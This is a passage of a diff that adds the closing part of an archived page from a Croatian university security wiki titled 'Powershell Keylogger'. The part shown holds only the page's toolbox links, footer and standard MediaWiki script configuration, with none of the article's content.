+					<li id="t-whatlinkshere"><a href="http://security.foi.hr/wiki/index.php/Posebno:%C5%A0to_vodi_ovamo/Powershell_Keylogger" title="Popis svih stranica koje sadrže poveznice ovamo [j]" accesskey="j">Što vodi ovamo</a></li>
+						<li id="t-recentchangeslinked"><a href="http://security.foi.hr/wiki/index.php/Posebno:Povezane_promjene/Powershell_Keylogger" title="Nedavne promjene na stranicama na koje vode ovdašnje poveznice [k]" accesskey="k">Povezane stranice</a></li>
+																																										<li id="t-specialpages"><a href="./Posebno:Posebne_stranice.html" title="Popis posebnih stranica [q]" accesskey="q">Posebne stranice</a></li>
+									<li id="t-print"><a href="http://security.foi.hr/wiki/index.php?title=Powershell_Keylogger&amp;printable=yes" rel="alternate" title="Verzija za ispis ove stranice [p]" accesskey="p">Verzija za ispis</a></li>
+						<li id="t-permalink"><a href="http://security.foi.hr/wiki/index.php?title=Powershell_Keylogger&amp;oldid=40377" title="Trajna poveznica na ovu verziju stranice">Trajna poveznica</a></li>
+						</ul>
+	</div>
+</div>
+
+<!-- /TOOLBOX -->
+
+<!-- LANGUAGES -->
+
+<!-- /LANGUAGES -->
+			</div>
+		<!-- /panel -->
+		<!-- footer -->
+		<div id="footer">
+											<ul id="footer-info">
+																	<li id="footer-info-lastmod"> Datum zadnje promjene na ovoj stranici: 13:31, 16. siječnja 2017.</li>
+																							<li id="footer-info-viewcount">Ova stranica je pogledana 1.211 puta.</li>
+																							<li id="footer-info-copyright">Sadržaji se koriste u skladu s <a href="http://creativecommons.org/licenses/by-sa/3.0/" class="external ">Creative Commons Attribution Share Alike</a>.</li>
+															</ul>
+															<ul id="footer-places">
+																	<li id="footer-places-privacy"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Za%C5%A1tita_privatnosti" title="SIS Wiki:Zaštita privatnosti">Zaštita privatnosti</a></li>
+																							<li id="footer-places-about"><a href="./SIS_Wiki:O_projektu_SIS_Wiki.html" title="SIS Wiki:O projektu SIS Wiki">O projektu SIS Wiki</a></li>
+																							<li id="footer-places-disclaimer"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:General_disclaimer" title="SIS Wiki:General disclaimer">Odricanje od odgovornosti</a></li>
+															</ul>
+											<ul id="footer-icons" class="noprint">
+					<li id="footer-copyrightico">
+						<a href="http://creativecommons.org/licenses/by-sa/3.0/"><img src="../skins/common/images/cc-by-sa.png" alt="Creative Commons Attribution Share Alike" width="88" height="31" /></a>
+					</li>
+					<li id="footer-poweredbyico">
+						<a href="http://www.mediawiki.org/"><img src="../skins/common/images/poweredby_mediawiki_88x31.png" alt="Powered by MediaWiki" width="88" height="31" /></a>
+					</li>
+				</ul>
+						<div style="clear:both"></div>
+		</div>
+		<!-- /footer -->
+		
+<script src="../load.php%3Fdebug=false&amp;lang=hr&amp;modules=startup&amp;only=scripts&amp;skin=vector&amp;*"></script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.config.set({"wgCanonicalNamespace": "", "wgCanonicalSpecialPageName": false, "wgNamespaceNumber": 0, "wgPageName": "Powershell_Keylogger", "wgTitle": "Powershell Keylogger", "wgAction": "view", "wgArticleId": 9245, "wgIsArticle": true, "wgUserName": null, "wgUserGroups": ["*"], "wgCurRevisionId": 40377, "wgCategories": [], "wgBreakFrames": false, "wgRestrictionEdit": [], "wgRestrictionMove": []});
+}
+</script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.loader.load(["mediawiki.util", "mediawiki.legacy.wikibits", "mediawiki.legacy.ajax"]);
+	mediaWiki.loader.go();
+}
+</script>
+
+<script>if ( window.mediaWiki ) {
+	mediaWiki.user.options.set({"ccmeonemails":0,"cols":80,"contextchars":50,"contextlines":5,"date":"default","diffonly":0,"disablemail":0,"disablesuggest":0,"editfont":"default","editondblclick":0,"editsection":1,"editsectiononrightclick":0,"enotifminoredits":0,"enotifrevealaddr":0,"enotifusertalkpages":1,"enotifwatchlistpages":0,"extendwatchlist":0,"externaldiff":0,"externaleditor":0,"fancysig":0,"forceeditsummary":0,"gender":"unknown","hideminor":0,"hidepatrolled":0,"highlightbroken":1,"imagesize":2,"justify":0,"math":1,"minordefault":0,"newpageshidepatrolled":0,"nocache":0,"noconvertlink":0,"norollbackdiff":0,"numberheadings":0,"previewonfirst":0,"previewontop":1,"quickbar":1,"rcdays":7,"rclimit":50,"rememberpassword":0,"rows":25,"searchlimit":20,"showhiddencats":0,"showjumplinks":1,"shownumberswatching":1,"showtoc":1,"showtoolbar":1,"skin":"vector","stubthreshold":0,"thumbsize":2,"underline":2,"uselivepreview":0,"usenewrc":0,"watchcreations":0,"watchdefault":0,"watchdeletion":0,
+	"watchlistdays":3,"watchlisthideanons":0,"watchlisthidebots":0,"watchlisthideliu":0,"watchlisthideminor":0,"watchlisthideown":0,"watchlisthidepatrolled":0,"watchmoves":0,"wllimit":250,"variant":"hr","language":"hr","searchNs0":true,"searchNs1":false,"searchNs2":false,"searchNs3":false,"searchNs4":false,"searchNs5":false,"searchNs6":false,"searchNs7":false,"searchNs8":false,"searchNs9":false,"searchNs10":false,"searchNs11":false,"searchNs12":false,"searchNs13":false,"searchNs14":false,"searchNs15":false});;mediaWiki.loader.state({"user.options":"ready"});
+}
+</script>		<!-- fixalpha -->
+		<script type="text/javascript"> if ( window.isMSIE55 ) fixalpha(); </script>
+		<!-- /fixalpha -->
+		<!-- Served in 0.399 secs. -->			</body>
+</html>
